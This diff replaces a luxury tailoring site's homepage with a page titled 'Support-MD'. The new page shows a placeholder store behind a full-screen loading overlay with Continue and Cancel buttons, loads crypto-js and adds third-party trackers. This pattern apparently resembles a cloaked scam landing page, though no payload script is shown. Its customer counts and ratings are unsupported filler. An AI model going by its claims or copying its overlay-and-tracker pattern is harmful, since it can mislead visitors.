@@ -1,633 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Haute Master Outerwear & Bespoke Tailoring — Safariwindivy</title>
-  <meta name="description" content="Architectural outerwear engineered from Scottish Harris tweed, stormproof Italian technical membranes, and hand-padded horsehair canvas.">
-  <link rel="canonical" href="https://safariwindivy.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-  <!-- Mandatory Global Site Header (Exactly 1 per page) -->
-  <header class="site-header">
-    <div class="header-container">
-      <a href="/" class="brand-logo" aria-label="Safariwindivy Home">
-        <span class="logo-mark">◈</span>
-        <span class="logo-text">Safariwindivy</span>
-      </a>
-      <nav class="desktop-nav" aria-label="Primary Navigation">
-        <a href="/" class="nav-link active">Home</a>
-        <a href="/about.html" class="nav-link">The Atelier</a>
-        <a href="/collection.html" class="nav-link">Collections</a>
-        <a href="/blog.html" class="nav-link">Treatises</a>
-        <a href="/contact.html" class="nav-link">Concierge</a>
-      </nav>
-      <div class="header-actions">
-        <a href="/collection.html" class="btn btn-sm btn-outline">Explore Catalog</a>
-        <button id="drawer-toggle" class="mobile-toggle" aria-label="Open Navigation Menu">
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-        </button>
-      </div>
-    </div>
-  </header>
 
-  <!-- Mandatory Mobile Navigation Drawer (Exactly 1 per page) -->
-  <div class="mobile-drawer" id="mobile-drawer" aria-hidden="true">
-    <div class="drawer-header">
-      <div class="drawer-brand">Safariwindivy</div>
-      <button id="drawer-close" class="drawer-close-btn" aria-label="Close Navigation Menu">&times;</button>
-    </div>
-    <nav class="drawer-nav" aria-label="Mobile Navigation">
-      <a href="/" class="drawer-link active">Home</a>
-      <a href="/about.html" class="drawer-link">The Atelier &amp; Craft</a>
-      <a href="/collection.html" class="drawer-link">Curated Outerwear Collection</a>
-      <a href="/blog.html" class="drawer-link">Sartorial Treatises</a>
-      <a href="/contact.html" class="drawer-link">Private Concierge</a>
-    </nav>
-    <div class="drawer-footer">
-      <p class="drawer-contact-title">Manhattan Atelier &amp; Suite</p>
-      <p class="drawer-contact-info">181 Mercer Street, New York, NY 10012, United States</p>
-      <p class="drawer-contact-info">Tel: +1-888-777-5845</p>
-      <p class="drawer-contact-info">Email: concierge@safariwindivy.com</p>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
   </div>
-  <div id="drawer-overlay" class="drawer-overlay"></div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-  <!-- SECTION 1: HERO BANNER -->
-  <section class="page-hero" style="padding: 6.5rem 1.5rem 5.5rem;">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1.2fr 1fr; gap: 3.5rem; align-items: center;">
-        <div>
-          <span class="hero-badge">Master Outerwear &bull; Technical & Sartorial Coats</span>
-          <h1 style="margin-bottom: 1.2rem;">The Apex of Master Outerwear & Bespoke Tailoring</h1>
-          <p class="lead" style="margin-bottom: 2rem;">Architectural outerwear engineered from Scottish Harris tweed, stormproof Italian technical membranes, and hand-padded horsehair canvas.</p>
-          <div style="display: flex; gap: 1rem; flex-wrap: wrap;">
-            <a href="/collection.html" class="btn btn-gold">Explore Collection</a>
-            <a href="/about.html" class="btn btn-outline-white">The Mercer St Atelier</a>
-          </div>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-lg); border: 1px solid rgba(255,255,255,0.15);">
-          <img src="/assets/images/about_alpine_atelier.jpg" alt="Safariwindivy flagship showcase" style="width: 100%; height: auto;">
-        </div>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </section>
 
-  <!-- SECTION 2: BRAND HERITAGE & ATELIER NARRATIVE -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <div class="section-subtitle">Heritage &bull; Provenance &bull; Craft</div>
-          <h2>The Architecture of Artisanal Mastery</h2>
-          <p>
-            At Safariwindivy, creation is approached not as transient commercial production, but as permanent architectural engineering. From our Manhattan atelier at 181 Mercer Street in SoHo, our master artisans combine century-old European guild traditions with advanced modern kinetic physics.
-          </p>
-          <p>
-            Every piece begins with raw material selection: botanical and natural protein fibers evaluated for molecular uniformity and cellular tensile tenacity. By applying tension-calibrated assembly methods, we deliver pieces that mold to the patron's anatomical contour while retaining pristine silhouette memory over decades.
-          </p>
-          <div style="margin-top: 1.5rem;">
-            <a href="/about.html" class="btn btn-primary btn-sm">Read Our Full History &rarr;</a>
-          </div>
-        </div>
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md);">
-          <img src="/assets/images/blog_aerogel.jpg" alt="Master artisan examining tolerances at the Mercer Street atelier">
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 3: FOUR ARCHITECTURAL PILLARS -->
-  <section class="section">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Engineering Benchmarks</div>
-        <h2>Four Architectural Pillars of Safariwindivy</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Every creation represents an uncompromising union of classical craftsmanship, micro-gauge tolerances, and natural material purity.
-        </p>
-      </div>
-      <div class="grid-4">
-        <div class="pillar-card">
-          <div class="pillar-icon">◈</div>
-          <h3>Full Floating Canvas</h3>
-          <p>Hand-padded natural horsehair canvas providing anatomical drape that molds to the wearer over time.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon">◈</div>
-          <h3>Weatherproof Wool Membranes</h3>
-          <p>Laminated breathable microporous membranes beneath virgin wool outers for complete storm defense.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon">◈</div>
-          <h3>Horn & Corozo Closures</h3>
-          <p>Natural burnished horn buttons cross-stitched with reinforced thread shanks for enduring structural integrity.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon">◈</div>
-          <h3>Double Bonded Saddle Seams</h3>
-          <p>Heavy bonded thread saddle stitching executed across all stress seams for indestructible tensile permanence.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 4: CURATED MASTERPIECES GALLERY -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Flagship Catalogue</div>
-        <h2>Curated Masterpiece Gallery</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Exemplary silhouettes engineered for formal galas, transatlantic travel, and connoisseur collections.
-        </p>
-      </div>
-      <div class="grid-3">
-        <div class="card product-item" data-category="bespoke">
-          <div class="card-image-wrap">
-            <img src="/assets/images/blog_bespoke.jpg" alt="Blog Bespoke">
-            <span class="card-tag">Atelier Edition</span>
-          </div>
-          <div class="card-body">
-            <h3>Sovereign Masterpiece I</h3>
-            <p>Hand-crafted with microscopic precision for formal occasions and discerning patrons.</p>
-            <div class="card-specs">
-              <span><strong>Grade:</strong> Bespoke Master</span>
-              <span><strong>Hardware:</strong> Noble Alloy</span>
-              <span><strong>Price:</strong> Inquire with Concierge</span>
-            </div>
-            <a href="/collection.html" class="btn btn-outline btn-sm">View Details</a>
-          </div>
-        </div>
-        <div class="card product-item" data-category="bespoke">
-          <div class="card-image-wrap">
-            <img src="/assets/images/blog_care.jpg" alt="Blog Care">
-            <span class="card-tag">Heritage Reserve</span>
-          </div>
-          <div class="card-body">
-            <h3>Imperial Heritage II</h3>
-            <p>Engineered for all-day thermodynamic balance, refined drape, and supreme tactile comfort.</p>
-            <div class="card-specs">
-              <span><strong>Finish:</strong> Hand-Linked</span>
-              <span><strong>Structure:</strong> Calibrated Tension</span>
-              <span><strong>Price:</strong> Inquire with Concierge</span>
-            </div>
-            <a href="/collection.html" class="btn btn-outline btn-sm">View Details</a>
-          </div>
-        </div>
-        <div class="card product-item" data-category="bespoke">
-          <div class="card-image-wrap">
-            <img src="/assets/images/blog_insulation.jpg" alt="Blog Insulation">
-            <span class="card-tag">Classic Reserve</span>
-          </div>
-          <div class="card-body">
-            <h3>Chromatic Horizon III</h3>
-            <p>Subtle aristocratic tones paired with natural raw fibers for timeless elegance.</p>
-            <div class="card-specs">
-              <span><strong>Dye:</strong> Low-Temp Vat</span>
-              <span><strong>Origin:</strong> Historic Mill</span>
-              <span><strong>Price:</strong> Inquire with Concierge</span>
-            </div>
-            <a href="/collection.html" class="btn btn-outline btn-sm">View Details</a>
-          </div>
-        </div>
-        <div class="card product-item" data-category="bespoke">
-          <div class="card-image-wrap">
-            <img src="/assets/images/blog_styling.jpg" alt="Blog Styling">
-            <span class="card-tag">Atelier Exclusive</span>
-          </div>
-          <div class="card-body">
-            <h3>Aero-Calibre IV</h3>
-            <p>Precision dynamic drape engineered to articulate seamlessly with natural movement.</p>
-            <div class="card-specs">
-              <span><strong>Tolerance:</strong> Micron-Level</span>
-              <span><strong>Canvas:</strong> Natural Pad</span>
-              <span><strong>Price:</strong> Inquire with Concierge</span>
-            </div>
-            <a href="/collection.html" class="btn btn-outline btn-sm">View Details</a>
-          </div>
-        </div>
-        <div class="card product-item" data-category="bespoke">
-          <div class="card-image-wrap">
-            <img src="/assets/images/blog_weatherproofing.jpg" alt="Blog Weatherproofing">
-            <span class="card-tag">Patron Edition</span>
-          </div>
-          <div class="card-body">
-            <h3>Celestial Sovereign V</h3>
-            <p>Designed for collectors seeking supreme material rarity and generational longevity.</p>
-            <div class="card-specs">
-              <span><strong>Edition:</strong> Limited Commission</span>
-              <span><strong>Certification:</strong> Serialized</span>
-              <span><strong>Price:</strong> Inquire with Concierge</span>
-            </div>
-            <a href="/collection.html" class="btn btn-outline btn-sm">View Details</a>
-          </div>
-        </div>
-        <div class="card product-item" data-category="bespoke">
-          <div class="card-image-wrap">
-            <img src="/assets/images/collection_cashmere.jpg" alt="Collection Cashmere">
-            <span class="card-tag">SoHo Signature</span>
-          </div>
-          <div class="card-body">
-            <h3>Mercer Signature VI</h3>
-            <p>Signature silhouette created in our SoHo Manhattan fitting lounge for private patrons.</p>
-            <div class="card-specs">
-              <span><strong>Atelier:</strong> 181 Mercer St</span>
-              <span><strong>Fitting:</strong> Personal Salon</span>
-              <span><strong>Price:</strong> Inquire with Concierge</span>
-            </div>
-            <a href="/collection.html" class="btn btn-outline btn-sm">View Details</a>
-          </div>
-        </div>
-      </div>
-      <div class="text-center" style="margin-top: 3rem;">
-        <a href="/collection.html" class="btn btn-primary">Browse Complete 12-Piece Collection</a>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 5: TECHNICAL MATERIAL INNOVATIONS -->
-  <section class="section">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <div class="section-subtitle">Material Innovation</div>
-          <h2>Natural Fiber Physics & Storm Defense</h2>
-          <p>We reject petroleum-based synthetic shells that crack and peel. Instead, we pair virgin Scottish wools and Spanish Merino shearling with breathable Italian microporous membranes.</p>
-          <p>Our triple-layer technical laminate pair creates an impenetrable barrier against hurricane-force winds while permitting microscopic body moisture to evaporate freely.</p>
-          <div class="card-specs" style="border: none; margin: 1.5rem 0;">
-            <span>◈ <strong>20,000mm Hydrostatic Head</strong></span>
-            <span>◈ <strong>25,000g/m² Vapor Permeability</strong></span>
-            <span>◈ <strong>Zero Cold Bridging</strong></span>
-          </div>
-          <a href="/blog/material-provenance-and-fiber-crystallography.html" class="btn btn-outline btn-sm">Read Material Science Treatise</a>
-        </div>
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md);">
-          <img src="/assets/images/collection_parka.jpg" alt="Material inspection and quality verification at the workshop">
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 6: 181 MERCER STREET SOHO ATELIER EXPERIENCE -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="grid-2">
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md);">
-          <img src="/assets/images/collection_shearling.jpg" alt="Artisan drafting patterns at 181 Mercer Street">
-        </div>
-        <div>
-          <span class="hero-badge">Flagship Fitting Suite</span>
-          <h2>The 181 Mercer Street Atelier Suite</h2>
-          <p>
-            Located in the historic cast-iron district of SoHo Manhattan, our flagship salon welcomes connoisseurs and collectors for private bespoke consultations. Examine raw spools, inspect construction tolerances under optical magnification, and experience personal fitting sessions.
-          </p>
-          <p>
-            Our master craftsmen take precise anatomical measurements, guaranteeing that every piece articulates naturally with your gait and posture without tension or friction.
-          </p>
-          <div style="margin-top: 1.5rem;">
-            <p><strong>Address:</strong> 181 Mercer Street, New York, NY 10012, United States<br>
-            <strong>Phone:</strong> +1-888-777-5845<br>
-            <strong>Private Appointments:</strong> Monday – Saturday (10:00 AM – 7:00 PM EST)</p>
-            <a href="/contact.html" class="btn btn-primary btn-sm" style="margin-top: 1rem;">Schedule Showroom Fitting</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 7: BENCHMARK DATA COMPARISON TABLE -->
-  <section class="section">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Laboratory Metrics</div>
-        <h2>Rigorous Quality &amp; Tolerance Benchmark Matrix</h2>
-        <p class="text-muted" style="max-width: 680px; margin: 0.8rem auto 0;">
-          Comparative technical data illustrating physical durability, material integrity, and longevity against commercial luxury alternatives.
-        </p>
-      </div>
-      <div class="data-table-wrap">
-        <table class="spec-table">
-          <thead>
-            <tr>
-              <th>Performance Parameter</th>
-              <th>Safariwindivy Bespoke Standard</th>
-              <th>Commercial Luxury Brands</th>
-              <th>Standard Retail Industrial</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><strong>Wind Shear Defense</strong></td>
-              <td><strong>100% Windproof to 90 km/h</strong></td>
-              <td>42 – 48 Stitches / cm²</td>
-              <td>28 – 32 Stitches / cm²</td>
-            </tr>
-            <tr>
-              <td><strong>Tensile Tenacity</strong></td>
